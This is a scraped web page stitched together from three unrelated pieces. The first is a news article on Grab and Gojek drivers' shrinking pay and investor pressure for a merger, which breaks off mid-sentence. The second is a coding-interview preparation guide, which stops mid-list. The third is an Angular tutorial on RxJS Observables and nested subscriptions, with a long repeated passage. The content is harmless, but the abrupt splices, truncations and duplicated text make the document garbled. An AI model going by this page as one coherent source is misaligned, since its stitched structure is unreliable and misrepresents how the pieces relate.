<p><span>W</span>hen Grab drivers in Ho Chi Minh City gathered late last year to protest against the ride-hailing company’s new fee structure, Nghia went instead to his other job, cutting cloth at an apparel factory. He had been driving for Grab for a few years, but even if he was free to join the demonstration, he wouldn’t have. “If I spoke up, I’d get nothing,’’ Nghia said.&nbsp;</p>



<p>In December 2020, drivers reported that the commissions that Grab Vietnam takes from them suddenly increased, from around 20% to nearly 30% on its motorbike service GrabBike, and even more on GrabCar, its taxi offering. The change came after the Vietnamese government had abruptly increased an <a rel="noreferrer noopener" href="https://e.vnexpress.net/news/business/companies/taxman-grab-at-odds-over-new-tax-regime-4204198.html" target="_blank">existing tax</a> on ride-hailing firms. Many drivers felt that Grab had passed the burden onto drivers and passengers, although the company says that this was a misunderstanding and that drivers’ commissions did not change, but that the new tax was added to fares, then deducted from drivers’ takings at the same time as the commission.</p>



<p>Nghia, a 31-year-old migrant from the Mekong Delta region in southern <a href="https://restofworld.org/2020/nguyen-viet-anh-docosan-vietnam/">Vietnam</a>, who asked to be identified by only his first name, started driving for Grab because he heard that he could earn more through the app than its competitors. Grab is one of several venture-backed firms vying for customers in Vietnam. The country’s fast-growing and rapidly digitizing economy has opened up a new frontier for tech companies in Southeast Asia.</p>



<p>Over the past few years, Grab and other ride-hailing players like Gojek Vietnam, owned by the Indonesian unicorn Gojek, have burned millions of dollars in investor cash <a href="https://restofworld.org/2021/fighting-off-the-unicorns/">trying to attract price-sensitive Vietnamese customers</a> and capture as much market share as possible. The strategy included offering steep discounts to consumers and generous incentives to drivers, who work as independent contractors with few labor protections.&nbsp;</p>



<p>The problem is that now their investors are eager to turn a profit, and the well of cash is starting to dry up. In Vietnam and other Southeast Asian countries, like Indonesia, Grab and Gojek had been raising prices for passengers before the Covid-19 lockdowns drastically cut the number of people using ride-hailing apps. Gig workers on the platform said that they felt squeezed before the pandemic, and more so during it.</p>



<p>But the two companies are also part of a pattern that started emerging around the world long before the pandemic. Enormous venture firms, most notably the Japanese mega-fund SoftBank, have poured billions into startups with the express purpose of winner-takes-all domination. Often, when it comes time to actually make money, it’s <a href="https://www.nytimes.com/2019/11/12/technology/softbank-startups.html">workers at the bottom</a> who bear the burden.&nbsp;</p>



<p>For Nghia,&nbsp;this has resulted in a one-two punch of fewer rides and lower fees, making driving for Grab barely worth his time. “Driving for a day, I don’t earn as much as people selling lottery tickets,” he said, referring to the roadside hawkers that are common in Ho Chi Minh City. “I have only been making around 200,000 dong [$8.70] a day this year, working from 7 a.m. to 9 p.m., not to mention the money I have to give back to Grab.”</p>



<p>Drivers aren’t the only ones unhappy with the ride-hailing firms. SoftBank, Grab’s biggest backer, is getting tired of Grab and Gojek “bleeding a lot of money,” according to an investor with knowledge of both companies, and <a href="https://www.ft.com/content/865dae7e-24ad-446d-a20c-4bfadfdb3e1d">wants the two to merge</a>. The reason is that they have fought their way into an expensive stalemate across Southeast Asia. Both Grab and Gojek have become multi-billion-dollar businesses by expanding into other services, though neither has yet turned a profit. While investors have continued to back them in an effort to build de facto monopolies, neither company has found a decisive advantage, and patience is wearing thin.&nbsp;</p>



<p>If a merger doesn’t happen, Gojek is reportedly <a href="https://www.ft.com/content/0775a49e-d3fd-4445-a394-19039a8561f6">in talks with another Indonesian unicorn</a>, the e-commerce company Tokopedia, while <a href="https://www.bloomberg.com/news/articles/2021-01-25/grab-is-said-to-pick-morgan-stanley-jpmorgan-for-u-s-ipo">Grab has reportedly selected banks</a> to explore an initial public offering in New York. Grab and Gojek did not respond to repeated requests for comment.</p>



<p>Gojek, Grab, and Tokopedia are enormous acquirers of technology and talent, whose gravity shapes the entire landscape. If they do consolidate, the effects are likely to ripple across the whole region. “If Gojek and Grab did the merger, the two organizations would have an unassailable monopoly on ride-hailing services in Southeast Asia,” one investor with knowledge of negotiations between the two companies told <em>Rest of World. </em>(Like all venture capital sources in this story, they spoke on the condition of anonymity.)</p>



<p>Labor groups worry that, if a merger were to happen, drivers would have less leverage than ever before. “They can control many things, monopolize the system and so on,” said Taha Syafariel Baraqbah, acting chairman of Indonesia’s Online Drivers’ Association, who goes by Ariel. “Of course we are afraid and feel that the conditions will be even more arbitrary.”</p>

<hr>



<p><strong>Gojek was founded</strong> in Indonesia in 2010 by Harvard Business School graduate and former McKinsey consultant Nadiem Makarim and his high school friend Michaelangelo Moran. Two years later, Grab was launched in Malaysia by two other Harvard graduates, Anthony Tan and Tan Hooi Ling. They later relocated the company to Singapore, in 2014.&nbsp;</p>



<p>Both startups attracted big-name investors, like Sequoia India and Golden Gate Ventures, which were lured by the tantalizing opportunity to reach consumers in Southeast Asia’s populous and increasingly prosperous markets. As Grab and Gojek continued to grow, so did the scale of their funding rounds and backers. SoftBank invested in Grab in 2014, while the Singaporean state investment fund <a href="https://www.reuters.com/article/us-go-jek-fundraising/google-temasek-investing-in-indonesias-go-jek-as-ride-hailing-rivalry-deepens-sources-idUSKBN1F70GS">Temasek</a> and the Chinese tech giant <a href="https://www.reuters.com/article/us-gojek-m-a-tencent/chinas-tencent-invests-in-indonesias-go-jek-amid-se-asia-push-sources-idUSKBN19P17N">Tencent</a> took stakes in Gojek soon after. In total, Grab has raised more than $12 billion, while Gojek has raised around $5 billion, according to the database Crunchbase.</p>



<p>Ride-hailing was an easy business to get into, since the existing transportation sector was dominated by traditional taxi companies, which had inflexible business models. There “was an obvious inefficiency and a market gap where you could come in and undercut the incumbents,” said Nitin Pangarkar, a strategy and policy professor at NUS Business School in Singapore. “The transport business was an asset-light model,” he explained, in that the drivers owned their own cars and motorbikes, and “it was a model that had been tried out elsewhere.”</p>

<p>To attract customers, Grab and Gojek spent heavily on deep discounts, eschewing profits in an effort to beat out the competition. “Ride hailing, definitely, was a money loser,” Pangarkar said. “That was because these crazy venture capitalists were willing to fund these price wars.”&nbsp;</p>



<p>Over the past few years, Grab and Gojek have expanded across Southeast Asia and begun to broaden the scope of their services, adding <a href="https://restofworld.org/2020/stat-of-the-day/cloud-kitchen-food/">food delivery</a>, groceries, payments, and logistics. In Indonesia, Gojek bought a stake in a bank, while in Singapore, Grab partnered with a telecommunications company to bid for a <a href="https://www.reuters.com/article/us-singtel-digital-banking-grab-holdings/singtel-grab-join-forces-for-singapore-digital-bank-license-idUSKBN1YY005">digital banking license</a>. Today, Grab and Gojek are no longer just loss-making ride-hailing companies — they’re sprawling conglomerates that convert investor cash into user numbers.</p>



<p>Even where ride hailing has become profitable in individual countries, the companies have reinvested into expanding into other business lines.</p>



<p>One early Gojek investor told <em>Rest of World</em> that the appeal of ride-hailing was that it promised to create a base of regular users, who could then be leveraged into other businesses, like food delivery and e-commerce. If they used enough services regularly, the thinking was that they would no longer be tempted to switch to a rival platform, no matter how many discounts competitors offered. Once they had captured consumers, Gojek and Grab could start increasing prices and move toward profitability.&nbsp;</p>



<p>“These businesses … can be very profitable, because essentially, they become monopolistic,” the Gojek investor said. “We haven’t reinvented the wheel, this is just monopolism in a different form.”</p>



<p>Investors in both Grab and Gojek told <em>Rest of World</em> that they are no longer confident either will ever become a quasi-monopoly on its own. Indonesia is by far the biggest market in the region, and Grab and Gojek are still fighting to dominate it, though Gojek has a slight lead. Grab is ahead in Vietnam, Malaysia, and the Philippines — all smaller markets unlikely to offer the scale that would excite investors. Neither has succeeded in building a single, pan-regional super app.</p>



<p>Since coworking giant WeWork <a href="https://www.newyorker.com/culture/culture-desk/the-rise-and-fall-of-wework">imploded</a> in 2019 after raising more than <a href="https://www.crunchbase.com/organization/wework/investor_financials">$20 billion</a>, venture capitalists have begun questioning the winner-takes-all approach, which requires essentially burning large sums of money to achieve dominance that’s anything but guaranteed. Even SoftBank, which has relied heavily on the strategy, is putting pressure on its portfolio companies to show that they can be sustainable in the short term, rather than at an unspecified point in the future.&nbsp;</p>



<p>Covid-19 has also made investors more rational, the Gojek investor said. Ride-hailing businesses have slumped during citywide lockdowns. Even in countries where economic activity is bouncing back, office workers are often not traveling at peak hours, robbing companies of surge pricing schemes that boost revenue. Food delivery has outperformed during the pandemic, but intense competition has also meant that it’s yet to be profitable.&nbsp;</p>



<p>“The amount of money we were burning on the Gojek side, and the amount of money that Grab was burning on their side, was crazy,” the Gojek investor said. “We’re happy that no one’s got the financial means to …</p></div></div>

February 8, 2021 | https://www.danhacks.com/software/software-engineering-coding-interview.html | <a href="https://web.archive.org/web/*/https://www.danhacks.com/software/software-engineering-coding-interview.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>To get a job as a software engineer, most companies have an interview process that includes coding. While these interviews aren’t perfect, they’re widely used, so in order to stay employable it’s a necessary skill to learn how to prepare and study for these interviews. There are plenty of resources online and this guide is a listing of many of these resources to help you practice once you have coding interviews scheduled.</p>

<p><img src="https://www.danhacks.com/assets/softwareEngineerInterview.jpg" alt="Software Engineering Interviewing"></p>

<p>To pass these interviews, a few skills are needed:</p>
<ul>
  <li>Have a clear, concise, and easy to read resume that describes specifically what you’ve done in school/work. Be prepared to talk about the projects you worked on in depth and describe how the solutions work.</li>
  <li>When a problem is presented, carefully read the requirements, ask clarifying questions, and propose a solution first before coding.</li>
  <li>Code quickly. Practice as many problems as possible, set a time limit for a problem (e.g. 20 mins), and try to solve it in that time. If you can’t figure one out in time, research the algorithms and solutions for it, study it line by line until you understand how it works, and try again. In a coding interview you’re typically presented at least 2 questions that you must solve in less than an hour.</li>
  <li>Understand common data structures and algorithms. Be able to apply them in your problem solving.</li>
  <li>Interpersonal skills. In addition to coding the solution, you’ll have to be able to clearly explain how it works and talk through the problem with the interviewer as you go. Practice online or with a friend. Quickly talk through the problem and your proposed solution before you start coding.</li>
  <li>Be able to analyze your solution in terms of time and space complexity. When presented with a problem try to think of the most efficient solution first and skip coding the naive solution. This will give you time to solve more problems.</li>
  <li>Learn clean code principles such as not repeating code, writing clear meaningful variable names,and separating large blocks of code into smaller functions.</li>
  <li>Practice building actual applications. This will help you move faster and be able to understand code better.</li>
  <li>Think of several test cases that would appropriately test your code. An interviewer may ask you to walk through one of them line by line and describe how it works.</li>
</ul>

<p>Additionally, if the interview is on the phone or video, ensure your environment sets you up for success.</p>
<ul>
  <li>Test your webcam and audio ahead of time</li>
  <li>Download any video conferencing software you need for the interview and test it ahead of time.</li>
  <li>Set up your computer in a quiet environment, put your phone on silent, and ask anyone in your household not to disturb you during the interview.</li>
  <li>Solving these problems quickly requires a lot of concentration and you don’t want to be interrupted during the interview and break your concentration.</li>
</ul>

<h3 id="data-structures-to-learn">Data structures to learn</h3>
<p>You’ll need to understand the operations on common data structures as well as how to implement them with more primitive data structures. For example, you could be asked in an interview to implement a stack or queue using an array. Here’s a list of some of the common data structures, but be sure to brush up with an algorithms book and/or YouTube videos to get a comprehensive understanding of how they work.</p>

<ul>
  <li>Maps</li>
  <li>Sets</li>
  <li>Trees</li>
  <li>Graphs</li>
  <li>Linked Lists</li>
  <li>Arrays</li>
  <li>Stacks</li>
  <li>Queues</li>
  <li>Heaps</li>
</ul>

<h3 id="algorithms-to-learn">Algorithms to learn</h3>
<p>There’s no shortage of algorithms, but here are a few that are frequently used in interviews, so be sure to gain mastery with a large breadth of problems.</p>

<ul>
  <li>Writing recursive code. Practice translating iterative to recursive and vice versa.</li>
  <li>Depth First Search</li>
  <li>Breadth First Search</li>
  <li>Set Theory (Unions, etc)</li>
  <li>Dynamic Programming</li>
  <li>String manipulation</li>
  <li>Array manipulation</li>
  <li>Matrix traversal</li>
  <li>Hashing</li>
  <li>Binary Search</li>
  <li>Efficient Sorting, e.g. Quicksort</li>
  <li>Bit Manipulation</li>
  <li>Build an LRU Cache</li>
</ul>

<h3 id="websites-with-problems">Websites with Problems</h3>
<ul>
  <li>
<a href="https://leetcode.com/" target="_blank" rel="noopener noreferrer">LeetCode</a> - LeetCode has different problem levels, so start by practicing easy, then work on medium, and later hard. Typically the questions in interviews will be easy or medium level. There are thousands of probleems on LeetCode and it’s arguably one of the best resources for practice problems.</li>
  <li>
<a href="https://www.hackerrank.com/" target="_blank" rel="noopener noreferrer">HackerRank</a> - HackerRank has a lot of problems like LeetCode, but is better organized and provides more context around which areas the algorithms you’re solving are in. Some companies use HackerRank, so it’s good to become familiar with the interface.</li>
  <li>
<a href="https://coderpad.io/" target="_blank" rel="noopener noreferrer">CoderPad</a> - CoderPad is used by a lot of companies for interviews, so practice using the interface so that you don’t waste time in an interview looking for buttons or being surprised by how the interface works with your programming language.</li>
  <li>
<a href="https://projecteuler.net/" target="_blank" rel="noopener noreferrer">Project Euler</a> - Project Euler has fun math problems, but they are not typically asked directly in an interview like the LeetCode or HackerRank questions. However, it still helps your problem solving and coding speed, so it can be good to play with some different websites to get a different perspective and learn to code faster.</li>
  <li>
<a href="https://www.youtube.com/" target="_blank" rel="noopener noreferrer">YouTube</a> - YouTube is invaluable and there’s tons of great YouTubers that will teach you how to do each type of problem. Simply search for more general terms such as “software engineering interview” or more specific problems, data structures, and algorithms you want to learn. Follow up by actually coding the solutions you learn so that you can do it in an interview.</li>
  <li>
<a href="https://www.algoexpert.io/" target="_blank" rel="noopener noreferrer">AlgoExpert</a> - AlgoExpert is like LeetCode and YouTube combined into an easy to use interface. It makes the problems and their solutions easily discoverable, as well as providing a place to practice.</li>
  <li>
<a href="https://interviewing.io/" target="_blank" rel="noopener noreferrer">Interviewing.io</a> - If you don’t have a friend that can help you practice real interviews, there are websites like Interviewing that let you interview with an actual engineer, but they can be pretty pricey. Instead of spending a lot of money doing practice interviews, you can also apply for more jobs and set up coding interviews with more companies. This way you can practice for free and potentially get an offer from a company at the same time.</li>
  <li>Other - There are countless other websites like LeetCode, some paid so experiment with different websites and find one that works best for you.</li>
</ul>

<h3 id="company-websites">Company Websites</h3>
<p>Doing research on the culture of the company you have an interview set up with helps with culture, but sometimes they also have information about the structure of the interviews, including how to practice for the coding portion.</p>

<ul>
  <li><a href="https://www.facebook.com/careers/life/preparing-for-your-software-engineering-interview-at-facebook" target="_blank" rel="noopener noreferrer">Facebook</a></li>
  <li><a href="https://www.apple.com/jobs/us/" target="_blank" rel="noopener noreferrer">Apple</a></li>
  <li><a href="https://www.amazon.jobs/en/landing_pages/software-development-topics" target="_blank" rel="noopener noreferrer">Amazon</a></li>
  <li><a href="https://jobs.netflix.com/culture" target="_blank" rel="noopener noreferrer">Netflix</a></li>
  <li><a href="https://careers.google.com/how-we-hire/" target="_blank" rel="noopener noreferrer">Google</a></li>
</ul>

<h3 id="programming-language-docs">Programming language docs</h3>
<p>In the interview you’ll typically be able to choose a programming language. Ensure you choose your best one that you can code quickly in. Study the docs for all of the data structures above. For example, if your programming language is Java, you might want to read the docs to <a href="https://docs.oracle.com/javase/8/docs/api/java/util/HashMap.html" target="_blank" rel="noopener noreferrer">HashMap</a> while practicing so that you don’t have to research things during the interview.</p>

<h3 id="linkedin">LinkedIn</h3>
<p>Before each interview if you know the name of the people conducting the interview, look their background up on LinkedIn ahead of time so that you have some context about their background when you’re talking to them. This will also let you know what to expect. For example, a manager may ask you about your projects and experience while an engineer might do an in depth coding interview.</p>

<h3 id="the-recruiter">The Recruiter</h3>
<p>Recruiters can be either internal or external to the company. Internal recruiters would only work for one company while an external recruiter might be able to set up interviews with multiple companies for you. You don’t have to pay the recruiter as the company will pay them when someone gets hired, so it’s typically in their best interest to get you an offer. Regardless of which type, except for smaller startups, most roles will have a recruiter coordinating the interview process. They can be invaluable to ask questions about what to study for and know what to expect in the interviews. They can also provide feedback after the interview so that you know which areas to study more for your next interview.</p>

<h3 id="books">Books</h3>

<p>Everyone learns differently and comprehensively going through books in addition to practicing using the above resources can give you an edge of others. Here’s a few that can be good to get started with.</p>

<ul>
  <li><a href="https://amzn.to/3tEAsvu" target="_blank" rel="noopener noreferrer">Introduction to Algorithms</a></li>
  <li><a href="https://amzn.to/2YUtkNt" target="_blank" rel="noopener noreferrer">Design Patterns</a></li>

<h3>But before we need to change our focus...</h3>
<p>As the owner of a store during the pandemic, you aim at counting the number of people that are currently in your store in order to enable social distancing inside. You could think of an iterative way which would be to check the number of people in your store and count it manually. You could also start at 0 in the morning when you open and then only look at the door, increment or decrement based on people coming or leaving the place. The first option requires burning the midnight oil, especially if your store has a lot of rooms. With the second option, you only have to look at the door without moving from your chair, which makes the calculation way easier.</p>
<p>This is exactly what Reactive programming is about:</p>
<blockquote>
<p><em>"Reactive programming is a programming paradigm that is built around the notion of continuous time-varying values and propagation of change. It facilitates the declarative development of event-driven applications by allowing developers to express programs in terms of what to do, and let the language automatically manage when to do it."</em> Bainomugisha et al., A Survey on Reactive Programming, 2012</p>
</blockquote>
<p><strong>Though it's conceptually hard to dive in at first glance, the code becomes easier to read and maintain, with a paradigm based on events happening in your application</strong>. Indeed, to come back to our store example, the second method fits clients' behavior best. A client spending a long time wandering in your store could be counted in many of the checks you make. Looking at the door is independent of this behavior. No matter what the client does in your store, it will only trigger two kinds of events: entrance, exit.</p>
<p><strong>Developers start thinking about code as a suite of events that modify a state</strong>. Rather than looking at the state, the object itself, the developer would look at the events that would modify the state, regardless of the state itself.</p>
<p>Here we'll dive in more depth into how <strong>Angular implements Reactive programming with the use of a pattern called Observable.</strong></p>
<h2>From callbacks to streams</h2>
<p>To better understand what Observables are, let's try to differentiate them starting from one of the most famous asynchronous patterns in JS, Promises. <strong>While a Promise happens once in time and will return the desired output or throw an error, Observables in Angular, are a stream of data over time.</strong> <strong>A stream can have multiple values succeeding at various frequencies in time</strong>. After we get the first value emitted on the Observable stream, contrary to a Promise, it will keep living until you complete it.</p>
<blockquote>
<p><em>"Reactive Programming is programming with asynchronous data streams."</em></p>
</blockquote>
<p>In order to access and use the values that are emitted through this stream, you can <code>subscribe</code> to this Observable stream and get notified every time a new value is emitted on this stream.</p>
<pre><code><span>Observable([1, 2, 3]).subscribe(number =&gt; console.log(number))</span><br><span>//Output: 1, 2, 3</span><p><span>Observable([1, 2, wait3seconds, 3]).subscribe(number =&gt; console.log(number))</span><br><span>//Output: 1, 2, ..., 3</span></p></code></pre>
<p>While Promises are like the action of going to a shop and buy your newspapers once, Observables act like a subscription to the magazine. Every time a new edition is published, every subscriber will receive a copy. Both the magazine (in case of bankruptcy for instance) or the subscribers can stop the subscription to this stream.</p>
<h3>Operators</h3>
<p><span>We are now going to dive into how to create and manipulate (transform, filter, ...) and terminate these observables. To perform these actions one can use Operators (for creation, and also transformation, filtering, termination)</span>. To better understand what these operators do to an Observable, we represent them using marble diagrams. You'll find a list of operators and their diagrams here at <a href="https://rxmarbles.com/" rel="noopener">RxMarbles</a><a href="https://rxmarbles.com/"></a>. These operators were popularised by the project <a href="http://reactivex.io/" rel="noopener">ReactiveX</a>&nbsp;which aims to provide different APIs in multiple programming languages (including RxJS, the one used in this article). <span>ReactiveX implements the Observer pattern, which is having Observers subscribing to events (Observables) and performing side effects based on this event, using combinations of operators.</span></p>
<p>I can subscribe to a magazine. When I receive a new one, I use an operator to make coffee and another one to read it.</p>
<p>Let's look at a classic creation operator to better grasp how observables are generated and evolve through time: the <code>interval</code>. <code>Interval</code> creates a stream of data that emits an incremented suite of integers at a given pace (in this example every 1000 ms)</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img2.png?width=2014&amp;name=Img2.png" alt="Img2" width="2014" srcset="https://www.sipios.com/hs-fs/hubfs/Img2.png?width=1007&amp;name=Img2.png 1007w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=2014&amp;name=Img2.png 2014w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=3021&amp;name=Img2.png 3021w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=4028&amp;name=Img2.png 4028w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=5035&amp;name=Img2.png 5035w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=6042&amp;name=Img2.png 6042w" sizes="(max-width: 2014px) 100vw, 2014px"></p>
<p>This creation can be pretty useful, but let's introduce transformation operators with another use case. If we don't want the list of integers but rather the list of multiples of ten we can use the Observable we just created and map the values using a transformation operator. This will enable you to transform the data emitted from the stream of the observable and create another stream from the input one.</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img3.png?width=1636&amp;name=Img3.png" alt="Img3" width="1636" srcset="https://www.sipios.com/hs-fs/hubfs/Img3.png?width=818&amp;name=Img3.png 818w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=1636&amp;name=Img3.png 1636w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=2454&amp;name=Img3.png 2454w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=3272&amp;name=Img3.png 3272w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=4090&amp;name=Img3.png 4090w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=4908&amp;name=Img3.png 4908w" sizes="(max-width: 1636px) 100vw, 1636px"></p>
<p>As a matter of fact, we can look at the map operator which applies a function to an entry Observable stream, and returns an Observable whose values are the output of the function applied to the entry stream values.</p>
<p>Eventually, you can use operators to stop the Observable stream. For instance, the <code>first</code> operator will complete the Observable after the first value is emitted on the stream. The <code>first</code> operator is actually enough to make an Observable behave like a Promise (which is the opposite of the purpose of this article but interesting to grasp the concept of Observables).</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img4.png?width=1636&amp;name=Img4.png" alt="Img4" width="1636" srcset="https://www.sipios.com/hs-fs/hubfs/Img4.png?width=818&amp;name=Img4.png 818w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=1636&amp;name=Img4.png 1636w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=2454&amp;name=Img4.png 2454w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=3272&amp;name=Img4.png 3272w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=4090&amp;name=Img4.png 4090w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=4908&amp;name=Img4.png 4908w" sizes="(max-width: 1636px) 100vw, 1636px"></p>
<p>Let's look at how we could use Observables, using them as Promises (which is the main pitfall new reactive programmers fall into).</p>
<h2>Moving to reactive programming: (unwisely) use Observables like Promises</h2>
<p><strong>The first misuse of Observables developers can make is to use them as if they were Promises thanks to the subscribe method.</strong> This method looks like a callback in which developers tend to put the behavior they will expect. Indeed one of the main pain point at first when dealing with Observables is how to manipulate the value. As Observables are lazy by nature, Angular will not calculate an observable if you do not subscribe to it, hence the reflex to subscribe, get the value and do something with it. This is exactly what callbacks are about.</p>
<p>However, as we said, unlike a Promise, Observable live through time, and contrary to callbacks, the code contained in the <code>subscribe</code> method will be executed every time the observable changes, resulting in potential side effects and memory leaks potentially.</p>
<p>Let's now look at a first piece of code that generates an (invalid) implementation of the carousel</p>
<p>The carousel dynamic is created thanks to an observable <code>interval</code>. This observable emits every 1500ms an integer. Its marble diagram is the aforementioned one.</p>
<pre><code><span>constructor(private http: HttpClient) {}</span><br><span>  search = new FormControl('');</span><br><span>  drinksCarousel = [];</span><br><span>  baseUrl = '&lt;https://www.thecocktaildb.com/api/json/v1/1/search.php?s=&gt;';</span><br><span>  ngOnInit() {</span><br><span>    this.search.valueChanges.subscribe((searchText: string) =&gt;</span><br><span>      this.http.get&lt;any&gt;(this.baseUrl + searchText).subscribe((results) =&gt; {</span><br><span>        interval(1500).subscribe((int) =&gt; {</span><br><span>          this.drinksCarousel = results.drinks.slice(int, int + 3);</span><br><span>        });</span><br><span>      })</span><br><span>    );</span><br><span>  }</span><br></code></pre>
<p><strong>We can see a first code smell here: nested subscribes.</strong> This behavior is often used to mimic callbacks as we said before but will trigger some side effects. If we type several letters, to look for "margarita" we get the following update</p>
<pre><code><span>&lt;div&gt;</span><br><span>  &lt;mat-form-field class="form-field" appearance="outline"&gt;</span><br><span>    &lt;mat-label&gt; What cocktail are you looking for? &lt;/mat-label&gt;</span><br><span>    &lt;input matInput [formControl]="search" autocomplete="off" /&gt;</span><br><span>  &lt;/mat-form-field&gt;</span><br><span>&lt;/div&gt;</span><p><span>&lt;div *ngFor="let drink of drinksCarousel" class="horizontal"&gt;</span><br><span>  &lt;app-cocktail-view</span><br><span>    [img]="drink.strDrinkThumb"</span><br><span>    [name]="drink.strDrink"</span><br><span>    [glass]="drink.strGlass"</span><br><span>    [instructions]="drink.strInstructions"</span><br><span>  &gt;&lt;/app-cocktail-view&gt;</span><br><span>&lt;/div&gt;</span></p></code></pre>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif" alt="Gif5" width="600" srcset="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=300&amp;name=Gif5.gif 300w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif 600w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=900&amp;name=Gif5.gif 900w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1200&amp;name=Gif5.gif 1200w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1500&amp;name=Gif5.gif 1500w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1800&amp;name=Gif5.gif 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>What we see here is that, instead of updating the <code>drinksCarousel</code> attribute and removing the previous list of values we had with the new one freshly fetched, multiple observables coexist and affect the state of our component simultaneously.</p>
<p>To come back to our analogy of the magazine subscription, what we would like to perform is to change the magazine we subscribe to, however, with nested subscribes, our code is creating a subscription to this new magazine, without terminating the previous one.</p>
<p>Every time our source observable (the search valueChanges) changes, the code inside the subscription is executed again. A new HTTP response is received, a new interval stream is created, thus creating another state change every 1.5s. Indeed none of the subscriptions are canceled, and they stack up silently into a huge mess until your computer crashes.</p></span></p></div></div></div>

<p><img src="https://www.sipios.com/hs-fs/hubfs/Img3.png?width=1636&amp;name=Img3.png" alt="Img3" width="1636" srcset="https://www.sipios.com/hs-fs/hubfs/Img3.png?width=818&amp;name=Img3.png 818w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=1636&amp;name=Img3.png 1636w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=2454&amp;name=Img3.png 2454w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=3272&amp;name=Img3.png 3272w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=4090&amp;name=Img3.png 4090w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=4908&amp;name=Img3.png 4908w" sizes="(max-width: 1636px) 100vw, 1636px"></p>
<p>As a matter of fact, we can look at the map operator which applies a function to an entry Observable stream, and returns an Observable whose values are the output of the function applied to the entry stream values.</p>
<p>Eventually, you can use operators to stop the Observable stream. For instance, the <code>first</code> operator will complete the Observable after the first value is emitted on the stream. The <code>first</code> operator is actually enough to make an Observable behave like a Promise (which is the opposite of the purpose of this article but interesting to grasp the concept of Observables).</p>

<p>Let's look at how we could use Observables, using them as Promises (which is the main pitfall new reactive programmers fall into).</p>
<h2>Moving to reactive programming: (unwisely) use Observables like Promises</h2>
<p><strong>The first misuse of Observables developers can make is to use them as if they were Promises thanks to the subscribe method.</strong> This method looks like a callback in which developers tend to put the behavior they will expect. Indeed one of the main pain point at first when dealing with Observables is how to manipulate the value. As Observables are lazy by nature, Angular will not calculate an observable if you do not subscribe to it, hence the reflex to subscribe, get the value and do something with it. This is exactly what callbacks are about.</p>
<p>However, as we said, unlike a Promise, Observable live through time, and contrary to callbacks, the code contained in the <code>subscribe</code> method will be executed every time the observable changes, resulting in potential side effects and memory leaks potentially.</p>
<p>Let's now look at a first piece of code that generates an (invalid) implementation of the carousel</p>
<p>The carousel dynamic is created thanks to an observable <code>interval</code>. This observable emits every 1500ms an integer. Its marble diagram is the aforementioned one.</p>
<pre><code><span>constructor(private http: HttpClient) {}</span><br><span>  search = new FormControl('');</span><br><span>  drinksCarousel = [];</span><br><span>  baseUrl = '&lt;https://www.thecocktaildb.com/api/json/v1/1/search.php?s=&gt;';</span><br><span>  ngOnInit() {</span><br><span>    this.search.valueChanges.subscribe((searchText: string) =&gt;</span><br><span>      this.http.get&lt;any&gt;(this.baseUrl + searchText).subscribe((results) =&gt; {</span><br><span>        interval(1500).subscribe((int) =&gt; {</span><br><span>          this.drinksCarousel = results.drinks.slice(int, int + 3);</span><br><span>        });</span><br><span>      })</span><br><span>    );</span><br><span>  }</span><br></code></pre>
<p><strong>We can see a first code smell here: nested subscribes.</strong> This behavior is often used to mimic callbacks as we said before but will trigger some side effects. If we type several letters, to look for "margarita" we get the following update</p>
<pre><code><span>&lt;div&gt;</span><br><span>  &lt;mat-form-field class="form-field" appearance="outline"&gt;</span><br><span>    &lt;mat-label&gt; What cocktail are you looking for? &lt;/mat-label&gt;</span><br><span>    &lt;input matInput [formControl]="search" autocomplete="off" /&gt;</span><br><span>  &lt;/mat-form-field&gt;</span><br><span>&lt;/div&gt;</span><p><span>&lt;div *ngFor="let drink of drinksCarousel" class="horizontal"&gt;</span><br><span>  &lt;app-cocktail-view</span><br><span>    [img]="drink.strDrinkThumb"</span><br><span>    [name]="drink.strDrink"</span><br><span>    [glass]="drink.strGlass"</span><br><span>    [instructions]="drink.strInstructions"</span><br><span>  &gt;&lt;/app-cocktail-view&gt;</span><br><span>&lt;/div&gt;</span></p></code></pre>
